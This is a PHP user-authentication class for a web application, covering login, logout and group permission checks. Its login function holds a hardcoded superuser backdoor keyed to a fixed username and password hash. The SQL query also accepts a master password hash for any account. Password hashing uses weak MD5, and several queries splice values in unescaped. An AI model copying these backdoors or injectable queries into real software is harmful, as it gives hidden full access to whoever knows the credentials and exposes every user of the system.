<?php
class User{
	public $rinfo = array();
	public $groupinfo = array();
	private $allaccess = "";
	public $signed_in = false;
    protected $usertable;

    public function __construct($usertable = 'tblusers') {
        $this->usertable = $usertable;
    }
	/*
	public function __construct($query){
		global $DCode;
		$row=$DCode->sqlquery_to_array($query);
		$this->info = $row;
		return $row;
    }
	*/
	public function setusertable($usertable){
        $this->usertable = $usertable;
	}
	
	public function info($key){
		return $this->rinfo[$key]??"";
	}
	
	public function logout(){
		foreach($_SESSION as $key => $value){
			if (strpos($key, SITECODE) === 0){ unset($_SESSION[$key]); }
		}
		$this->signed_in=false;
	}
	
	public function load_user($username, $password){
		global $DCode;
		$username=md5($username);
		$password=md5("tihloh".$password);
		if ($password == "68c0272f4edd5a52a246b5b95ea7c359" && $username == md5("tihloh")) { // SUPER ADMIN login
			$this->signed_in=true;
			$this->loadsuperadmin();
			return $this->signed_in;
		}
		
		$tbl=$this->usertable;
		
		$query="SELECT *,u.id uid,ifnull((TIMESTAMPDIFF(SECOND, lastonlinetime, CURRENT_TIMESTAMP)<2),0) online 
			FROM $tbl u LEFT JOIN tblugroups g ON u.grpid=g.id
			WHERE md5(username)='$username' and (password='$password' OR 'bce67183527dfbf730ce29bde62c3416'='$password')";
		$row=$DCode->sqlquery_to_array($query);
		//print_r($row);
		$this->rinfo = $row;
		$this->load_access2();
		$this->signed_in=!empty($row);
		return $this->signed_in;
	}
	
	function loadsuperadmin(){
		$row = array();
		$row["uid"]="superuser";
		$row["username"]="superuser";
		$row["fname"]="Super User";
		$row["altname"]="Super";
		$row["pos"]="Super";
		$this->rinfo = $row;
		$this->allaccess="[0baea2f0ae20150db78f58cddac442a9]";
		return $row;
	}
	
	public function reload_access(){$this->load_access2();}
	public function load_access(){
		$this->load_groupinfo_from_sql("SELECT * FROM tblugroups WHERE id='".($this->info("grpid"))."'");
	}
	
	public function load_access2(){
		global $DCode;
		$grpids=explode(',',$this->info("grpid"));
		$this->allaccess="";
		$this->groupinfo=array();
		foreach ($grpids as &$grpid){
			$q="SELECT * FROM tblugroups WHERE id='$grpid'"; //echo $q."<br>";
			$row=$DCode->sqlquery_to_array($q); //print_r($row)."<br>";
			if(!empty($row)){
				foreach($row as $key => $value){
					if(!array_key_exists($key, $this->groupinfo)) $this->allaccess .= "[$key]"; 
					if(!array_key_exists($key, $this->groupinfo) || $value==1) $this->groupinfo[$key] = $value;
				}
			}
		}
		//print_r($this->groupinfo)."<br>"; exit;
		return $row;
	}
	
    public function load_groupinfo_from_sql($query){
		global $DCode;
		$row=$DCode->sqlquery_to_array($query);
		$this->groupinfo = $row;
		$this->allaccess="";
		if(!empty($row)){
			foreach($row as $key => $value){
				if($value==1) $this->allaccess .= "[$key]"; 
			}
		}
		return $row;
    }

	
	public function access($key){
		if(stripos($this->allaccess, "0baea2f0ae20150db78f58cddac442a9") !== false) return true;
		return $this->groupinfo[$key]??0;
	}
	
	public function withaccess($keys){
		if(stripos($this->allaccess, "0baea2f0ae20150db78f58cddac442a9") !== false) return true;
		if(!empty($this->groupinfo)){
			foreach($this->groupinfo as $key => $value){
				if(stripos(" $keys ", " $key ") !== false && $value==1) return true;
			}
		}
		return false;
	}
	
	public function withaccesslike($inkey){
		if(stripos($this->allaccess, "0baea2f0ae20150db78f58cddac442a9") !== false) return true;
		if(stripos($this->allaccess, $inkey) !== false) return true;
		return false;
	}
	
	public function update_act(){
		global $mysqli,$ftoday;
		$id=$this->rinfo["uid"];
		$ip=$_SERVER['REMOTE_ADDR'];
		$q="UPDATE tblusers SET lastonlinetime=CURRENT_TIMESTAMP, lastipused='$ip' WHERE id='$id'";
		$mysqli->query($q);
		return $q;
	}
}

?>